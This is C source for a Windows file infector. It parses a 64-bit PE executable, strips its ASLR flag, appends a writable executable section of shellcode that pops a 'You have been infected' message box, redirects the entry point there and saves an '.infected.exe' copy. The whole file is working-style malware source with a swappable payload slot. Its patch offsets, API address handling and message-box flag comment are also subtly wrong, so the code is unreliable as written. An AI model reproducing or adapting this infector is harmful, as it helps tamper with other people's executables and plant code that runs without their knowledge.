#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 64-bit shellcode template:
//    xor rcx, rcx                 ; hWnd = NULL
//    lea rdx, [rip+txt]           ; lpText
//    lea r8,  [rip+cap]           ; lpCaption
//    mov r9d, 0x31                ; uType = MB_OK|MB_ICONWARNING
//    call MessageBoxA             ; patched at runtime
//    jmp  [old OEP]               ; patched at runtime
unsigned char shellcode_template[] = {
    0x48, 0x31, 0xC9,                         // xor rcx, rcx
    0x48, 0x8D, 0x15, 0,0,0,0,                // lea rdx, [rip+txt]
    0x4C, 0x8D, 0x05, 0,0,0,0,                // lea r8,  [rip+cap]
    0x41, 0xB9, 0x31,0x00,0x00,0x00,          // mov r9d, 0x31
    0xE8, 0,0,0,0,                            // call MessageBoxA (rel32)
    0xE9, 0,0,0,0                             // jmp back to OEP (rel32)
};

int main(int argc, char** argv) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <target_64bit_pe.exe>\n", argv[0]);
        return 1;
    }
    const char* targetPath = argv[1];

    // 1. Read target into memory
    FILE* f = fopen(targetPath, "rb");
    if (!f) { perror("fopen"); return 1; }
    fseek(f, 0, SEEK_END);
    long fileSize = ftell(f);
    fseek(f, 0, SEEK_SET);
    BYTE* buffer = malloc(fileSize);
    if (!buffer) { perror("malloc"); fclose(f); return 1; }
    fread(buffer, 1, fileSize, f);
    fclose(f);

    // 2. Parse headers
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)buffer;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(buffer + dos->e_lfanew);
    IMAGE_FILE_HEADER* fh = &nt->FileHeader;
    IMAGE_OPTIONAL_HEADER64* oh = &nt->OptionalHeader;

    if (oh->Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        fprintf(stderr, "%s is not a 64-bit PE\n", targetPath);
        free(buffer);
        return 1;
    }

    // Disable ASLR so preferred ImageBase is used
    oh->DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;

    DWORD oldOEP    = (DWORD)oh->AddressOfEntryPoint;
    ULONGLONG imageBase = oh->ImageBase;

    // 3. Locate last section & calculate new section parameters
    IMAGE_SECTION_HEADER* secs = 
      (IMAGE_SECTION_HEADER*)((BYTE*)&nt->OptionalHeader + fh->SizeOfOptionalHeader);
    IMAGE_SECTION_HEADER* last = &secs[fh->NumberOfSections - 1];

    DWORD fileAlign = oh->FileAlignment;
    DWORD secAlign  = oh->SectionAlignment;
    DWORD shellSize = sizeof(shellcode_template);

    DWORD newVA  = (DWORD)(((last->VirtualAddress + last->Misc.VirtualSize + secAlign - 1) / secAlign) * secAlign);
    DWORD newRaw = (DWORD)(((last->PointerToRawData  + last->SizeOfRawData  + fileAlign - 1) / fileAlign) * fileAlign);

    // 4. Prepare new section header (space for shellcode + strings)
    const char* cap = "Alert";
    const char* txt = "You have been infected";
    DWORD capLen = (DWORD)strlen(cap) + 1;
    DWORD txtLen = (DWORD)strlen(txt) + 1;

    IMAGE_SECTION_HEADER ns = {0};
    memcpy(ns.Name, ".injc", 5);
    ns.VirtualAddress   = newVA;
    ns.Misc.VirtualSize = shellSize + capLen + txtLen;
    ns.PointerToRawData = newRaw;
    ns.SizeOfRawData    = (DWORD)(((ns.Misc.VirtualSize + fileAlign - 1) / fileAlign) * fileAlign);
    ns.Characteristics  = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

    // 5. Expand buffer and reparse headers
    buffer = realloc(buffer, newRaw + ns.SizeOfRawData);
    dos    = (IMAGE_DOS_HEADER*)buffer;
    nt     = (IMAGE_NT_HEADERS64*)(buffer + dos->e_lfanew);
    fh     = &nt->FileHeader;
    oh     = &nt->OptionalHeader;
    secs   = (IMAGE_SECTION_HEADER*)((BYTE*)&nt->OptionalHeader + fh->SizeOfOptionalHeader);

    // Insert new section
    secs[fh->NumberOfSections] = ns;
    fh->NumberOfSections++;
    oh->SizeOfImage = newVA + ns.SizeOfRawData;

    // 6. Copy shellcode & strings into section
    BYTE* data = buffer + newRaw;
    DWORD offsCap = shellSize;
    DWORD offsTxt = offsCap + capLen;

    memcpy(data, shellcode_template, shellSize);
    memcpy(data + offsCap, cap, capLen);
    memcpy(data + offsTxt, txt, txtLen);

    #define PATCH32(ptr, val) (*(DWORD*)(ptr) = (DWORD)(val))
    // Patch lea rdx,[rip+txt] (offset from next instr)
    PATCH32(data + 5, (DWORD)(newVA + offsTxt - (newVA + 5 + 4)));
    // Patch lea r8,[rip+cap]
    PATCH32(data + 12, (DWORD)(newVA + offsCap - (newVA + 12 + 4)));
    // Patch call MessageBoxA
    {
        DWORD callSite = newVA + 19; // offset of E8
        DWORD msgAddr  = (DWORD)GetProcAddress(GetModuleHandleA("user32.dll"), "MessageBoxA");
        DWORD rel      = msgAddr - (DWORD)(imageBase + callSite + 5);
        PATCH32(data + 20, rel);
    }
    // Patch jmp back to old OEP
    {
        DWORD jmpSite = newVA + 24; // offset of E9
        DWORD rel      = (DWORD)(oldOEP - (jmpSite + 5));
        PATCH32(data + 25, rel);
    }
    #undef PATCH32

    // 7. Redirect entry point
    oh->AddressOfEntryPoint = newVA;

    // 8. Write infected file
    char outPath[MAX_PATH];
    snprintf(outPath, MAX_PATH, "%s.infected.exe", targetPath);
    FILE* o = fopen(outPath, "wb");
    if (!o) { perror("fopen out"); free(buffer); return 1; }
    fwrite(buffer, 1, newRaw + ns.SizeOfRawData, o);
    fclose(o);
    free(buffer);

    printf("Injected -> %s\n", outPath);
    return 0;
}
